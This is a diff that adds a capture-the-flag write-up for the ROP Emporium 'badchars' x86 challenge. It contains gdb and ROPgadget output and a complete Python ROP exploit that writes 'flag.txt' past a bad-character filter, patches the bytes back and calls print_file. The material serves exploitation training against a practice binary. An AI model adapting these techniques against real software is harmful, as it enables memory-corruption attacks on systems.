@@ -201,4 +201,204 @@ Now, we just need to add our byte patching gadgets onto the end of our chain.
 ## The byte-patcher gadgets
 There is another sequence of gadgets in the usefulGadgets section which we can use here:
 
+```
+# gdb badchars32 
 
+(gdb) disas usefulGadgets
+...
+   0x0804854b <+8>:     sub    BYTE PTR [ebp+0x0],bl
+   0x0804854e <+11>:    ret
+```
+
+It's not clear to me why gdb disassembled that gadget as `[ebp+0x0]`, rather than just `[ebp]`, but the point remains the same. If we can control ebx (and the lowest byte of ebx, bl) and ebp, we can subtract bl from the byte at the address of ebp! This is exactly what we need to do to modify our bytes back. We can use a similar `pop/pop/pop/pop/ret` gadget to control ebx and ebp:
+
+```
+# ROPgadget --binary badchars32 | egrep "pop ebp|pop ebx"
+0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+```
+
+Putting it together in a python function, which takes an address to patch (hence why we saved those addresses earlier when we wrote the `sanitize()` function):
+```python
+
+def patch_byte(addr):
+    pop_ebx_pop_esi_pop_edi_pop_ebp_ret = b'\xb8\x85\x04\x08'
+    sub_byte_ptr_ebp_bl_ret             = b'\x4b\x85\x04\x08'
+
+    print(f"Transforming data at {addr.hex()}")
+
+    """ jump to pop/pop/pop/pop/ret gadget;
+        set up registers for sub call;
+        ret to sub call
+    """
+
+    # sub gadget only cares about bl (lowest byte of ebx)
+    # so we can use any 3 bytes after \x01.
+    # esi/edi don't matter.
+    # address goes into ebp for sub gadget.
+    payload = pop_ebx_pop_esi_pop_edi_pop_ebp_ret + \
+            b'\x01AAA' + \
+            deadcode + \
+            deadcode + \
+            addr + \
+            sub_byte_ptr_ebp_bl_ret
+
+    return payload
+```
+
+Since we kept track of the addresses that need to be patched earlier, calling the `patch_byte` function is as simple as:
+```
+for addr in transformed:
+    payload += patch_byte(addr)
+```
+
+The only thing that's left to do is return to `print_file`, and pass the address of our sweet, sweet, `b'flag.txt'` string as an argument.
+
+Putting it all together, here is the complete exploit script:
+
+```python
+#!/usr/bin/python
+import sys
+import struct
+
+payload_locations = [
+    b'\x50\xa0\x04\x08',
+    b'\x54\xa0\x04\x08',
+    b'\x58\xa0\x04\x08'
+]
+
+transformed = []
+deadcode   = b'\xde\xc0\xad\xde'
+
+def write_what_where_sanitize(data, addr):
+    """
+        4-byte write primitive using the following gadgets:
+        0x0804854f  mov DWORD PTR [edi],esi; ret
+        0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
+    """
+
+    """
+        I can also control ebx with this gadget...
+        0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+
+        And I can modify data at the address of ebp.
+           0x08048543  add    BYTE PTR [ebp+0x0],bl ; ret
+           0x08048547  xor    BYTE PTR [ebp+0x0],bl ; ret
+           0x0804854b  sub    BYTE PTR [ebp+0x0],bl ; ret
+    """
+
+    if len(data) != 4:
+        raise Exception("data length must be 4")
+
+    ## Modify data prior to writing it to the stack
+    print(f"Original data: {data}")
+    data_sanitized = sanitize(data, addr)
+
+    print(f"Writing sanitized data: {data_sanitized}")
+
+    pop_esi_pop_edi_pop_ebp_ret = b'\xb9\x85\x04\x08'
+    mov_dword_ptr_edi_esi       = b'\x4f\x85\x04\x08'
+    deadcode = b'\xde\xc0\xad\xde'
+
+    # jump to pop/pop/pop/ret gadget; set up registers for mov call; ret to mov call
+    payload = pop_esi_pop_edi_pop_ebp_ret + \
+            data_sanitized + \
+            addr + \
+            deadcode + \
+            mov_dword_ptr_edi_esi
+
+    return payload
+
+def sanitize(data, start_addr):
+    """
+        Iterate over data at start_addr,
+        Transform characters as needed (by adding one)
+        And keep track of the address of each of the
+        transformed characters.
+    """
+    badchars    = ['x', 'g', 'a', '.']
+    new_bytes   = b''
+
+    for idx, c in enumerate(data):
+        if chr(c) in badchars:
+
+            # Add one to the byte to evade the filtering
+            # Store the address where the modified data is
+            modified_addr = struct.pack("<I", (struct.unpack("<I", start_addr)[0] + idx))
+            print(f"Modified data at {modified_addr.hex()})")
+            transformed.append(modified_addr)
+
+            new_bytes += bytes([(c+1)])
+        else:
+            new_bytes += bytes([c])
+
+    return new_bytes
+
+def patch_byte(addr):
+    """
+        Patch one byte by subtracting one from a byte at a given address.
+
+        gadget to subtract one from a byte:
+        0x0804854b : sub byte ptr [ebp], bl ; ret
+
+        can control ebp and bl with this gadget:
+        0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+    """
+    pop_ebx_pop_esi_pop_edi_pop_ebp_ret = b'\xb8\x85\x04\x08'
+    sub_byte_ptr_ebp_bl_ret             = b'\x4b\x85\x04\x08'
+
+    print(f"Transforming data at {addr.hex()}")
+
+    """ jump to pop/pop/pop/pop/ret gadget;
+        set up registers for sub call;
+        ret to sub call
+    """
+
+    # sub gadget only cares about bl (lowest byte of ebx)
+    # so we can use any 3 bytes after \x01.
+    # esi/edi don't matter.
+    # address goes into ebp for sub gadget.
+    payload = pop_ebx_pop_esi_pop_edi_pop_ebp_ret + \
+            b'\x01AAA' + \
+            deadcode + \
+            deadcode + \
+            addr + \
+            sub_byte_ptr_ebp_bl_ret
+
+    return payload
+
+flag_str   = b'flag'
+dot_txt    = b'.txt'
+null_bytes = b'\x00lol' # to terminate the string
+
+print_file = b'\xd0\x83\x04\x08'
+deadcode   = b'\xde\xc0\xad\xde'
+
+payload = b'A'*40
+payload += b'B'*4                # ebp
+
+## write data to memory in sanitized form
+payload += write_what_where_sanitize(flag_str, payload_locations[0])
+payload += write_what_where_sanitize(dot_txt, payload_locations[1])
+payload += write_what_where_sanitize(null_bytes, payload_locations[2])
+
+# rop to modify bytes as necessary
+for addr in transformed:
+    payload += patch_byte(addr)
+
+payload += print_file            # function to exec
+payload += deadcode              # return for print_file
+payload += payload_locations[0]  # argument for print_file
+
+sys.stdout.buffer.write(payload)
+```
+
+Running it:
+```
+python challenge.py | ./badchars32 
+badchars by ROP Emporium
+x86
+
+badchars are: 'x', 'g', 'a', '.'
+> Thank you!
+ROPE{a_placeholder_32byte_flag!}
+```
